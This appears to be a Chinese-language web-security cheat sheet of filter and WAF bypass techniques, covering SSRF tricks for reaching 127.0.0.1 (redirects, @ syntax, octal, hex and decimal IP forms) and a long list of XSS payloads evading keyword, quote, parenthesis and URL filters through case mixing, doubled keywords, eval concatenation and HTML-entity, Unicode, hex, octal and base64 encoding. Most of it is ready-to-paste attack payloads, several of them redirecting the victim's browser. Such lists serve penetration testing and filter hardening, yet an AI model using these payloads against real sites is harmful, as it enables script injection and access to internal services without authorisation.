# Web安全

## SSRF绕过

### 1.302跳转

**当过滤127.0.0.1和localhost时，可以使用sudo.cc服务，当访问这个服务的时候，会自动重定向至127.0.0.1**

### 2.@绕过

**当要求必须以什么网址开头时，可以使用url=http://xxx@127.0.0.1等价于url=http://127.0.0.1**

### 3.特殊数字绕过

**127.0.0.1等价于1②7.0.0.1**

### 4.句号替代.绕过

**127.0.0.1 == 127。0。0。1**

### 5.省略中间的0

**127.1==127.0.0.1**

### 6.进制转换

```shell
127.0.0.1
0177.0.0.1 //八进制
0x7f.0.0.1 //十六进制
2130706433 //十进制
```

### 7.特殊的0

**在Linux下0.0.0.0，0代表127.0.0.1**

### 8.DNS重绑定

## XSS绕过

### 1.空格被过滤

#### **用/代替空格**

#### **用回车符CR(%0d) 和换行符LF(%0a)取代空格**

**PS：HTML中`%0a`和`%0d`是可以当成空格使用的。**

### 2.关键词被过滤

#### **用`<svg>`标签(个人感觉比较少被过滤,起码比`<script>`标签少)**

```html
<svg onload="alert(1)">
```

**基于像`<script>`标签这样被过滤的情况。`<img>`标签配合事件也行，不过基本都是配合`onerror`事件属性，别的事件更难触发，像`onclick`事件要触发还需要受害者点击等等，如果`onerror`事件属性被过滤了再考虑使用。下面也有大量用到。**

#### 注释符干扰绕过

**html中的注释标签`<!-- 在此处写注释 -->`用于在 HTML 插入注释。**

**绕过例子：**

```html
<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>
```

#### 大小写绕过

```html
<ImG sRc=1 onerRor=alert(1);>
    
<SvG OnlOad="alert(1)">
```

#### 双写关键字（有限制）

**有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字来绕过：**

```html
<imimgg srsrcc=x onerror=alert("xss");>
```

**先判断哪些关键字被过滤，然后再试试双写它。还是要具体情况具体分析吧，如果waf不是只替换一次且是替换为空，可能就不行了**

#### 字符拼接

**利用`eval`，这里反引号也可以用单引号、双引号**

```html
<img src="x" onerror="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">

<svg onload="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">
```

**利用`top`，这里反引号也可以用单引号、双引号**

```html
<script>top[`al`+`ert`](1);</script>

<img src="x" onerror="top['al'+'ert'](1);">

<svg onload='top["al"+"ert"](1);'>
```

#### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，那么我们就可以使用其它字符去混淆我们注入的代码了。
下面举几个简单的例子：

```html
可利用注释、标签的优先级等
1.<<script>alert(1);//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert(1);//";</SCRIPT>
```

#### 编码绕过

##### HTML实体编码绕过

```html
10进制实体编码：
<img src=1 onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

16进制实体编码：
<img src=1 onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;&#x3B;">
```

##### Unicode编码绕过

```html
<img src='a' onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```

##### escape编码绕过（URL编码）

```html
<img src="a" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
```

##### ASCII码绕过

```html
<img src="b" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

##### 十六进制编码绕过

```html
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

**这里就是普通的十六进制编码转换，像`61`就是`a`转换过来的,`6c`是`l`,`65`是`e`，依次下去就是`alert('xss')`。只不过每个前面都要加`\x`，因为Javascript里`\x`开头的通常是16进制编码的数据。这里注意`\x`的`x`是小写不能大写。**

##### 八进制编码绕过

```html
<script>eval("\141\154\145\162\164\50\57\170\163\163\57\51");</script> 
```

**这里转换的也是`alert('xss')`。具体过程是先将`a`转换ASCII码十进制为97，再转换成8进制就为141了。记得141前面要加`\`，因为Javascript里`\`开头的通常是8进制编码的数据。后面依此类推。**

##### base64绕过

```html
<img>标签举例：
<img src="c" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">   //原payload为document.location='http://www.baidu.com'

<img src="c" onerror="eval(atob('YWxlcnQoInhzcyIp'))">

<iframe>标签举例：
<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>

<object>标签举例：
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">img</object>
```

#### Javascript伪协议的使用

**例子：`<table background="javascript:alert(1)"></table>`。其中引号可以去掉**
**支持Javascript伪协议的属性有：`img`,`href`,`lowsrc`,`bgsound`,`background`,`action`,`dynsrc`**

#### `""`包裹的js代码利用空格、回车、tab键

**js代码中，利用`空格`，`回车`，`tab键`，切记只有`""`包裹的js代码才可以随便利用`空格`，`回车`，`tab键`，比如`src="java script:xxxx"`，而这样不行：`src=java script:xxxx`。而且`回车`、`换行`不支持在`on事件`中使用，`空格`可以**

**Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。**

例：

```javascript
var a = 1
var b = 2;
//上述语句都正确
```

**示例：`<img src="javas cript:alert(1)">`,中间为`tab键`**

```html
用于绕过某些XSS防护
<img src="jav   ascript:alert('XSS');">

    也可以对TAB编码
<img src="jav&#x09;ascript:alert('XSS');">

    利用换行符拆解
<img src="jav&#x0A;ascript:alert('XSS');">

    利用回车拆解
<img src="jav&#x0D;ascript:alert('XSS');">
```

### 3.双引号、单引号被过滤的情况

#### 用反引号绕过

**如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。**

举例：

```
<img src="1" onerror=alert(1);>可以，
<img src=`1` onerror=alert(1);>不行；

<img src="1" onerror='alert(1)';>可以，
<img src="1" onerror=`alert(1)`;>不行；

<img src="x" onerror=alert('1');>可以，
<img src="x" onerror=alert(`1`);>可以；
```

**反引号绕过的例子：**

```
<img src="x" onerror=alert(`xss`);>
```

#### 编码绕过

### 4.括号被过滤的情况

#### 用`throw`来绕过

```html
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

### 5.url地址被过滤的情况

#### 使用url编码

```html
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

#### 使用IP地址

**127.0.0.1**

**1.十进制IP**

```html
<img src="x" onerror=document.location=`http://2130706433/`>
```

**2.八进制IP**

```html
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

**3.十六进制IP**

```html
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

#### 用`//`代替`http://`

```html
<img src="x" onerror=document.location=`//www.baidu.com`>
```

#### 用`\\`代替`http://`（服务器是Linux系统可以绕过,Windows则不行）

```
要注意在windows中\本身就有特殊用途，是一个path的写法，所以\\在Windows下是file协议，在linux中才会是当前域的协议
```

#### 用`。`中文句号代替`.`英文句号

如果你在你在域名中输入`。`中文的句号，浏览器会自动转化成`.`英文的句号

```html
<img src="x" onerror="document.location=`http://www。baidu。com`">  //会自动跳转到百度
```

### 特别致谢，参考文章：https://www.freebuf.com/vuls/287655.html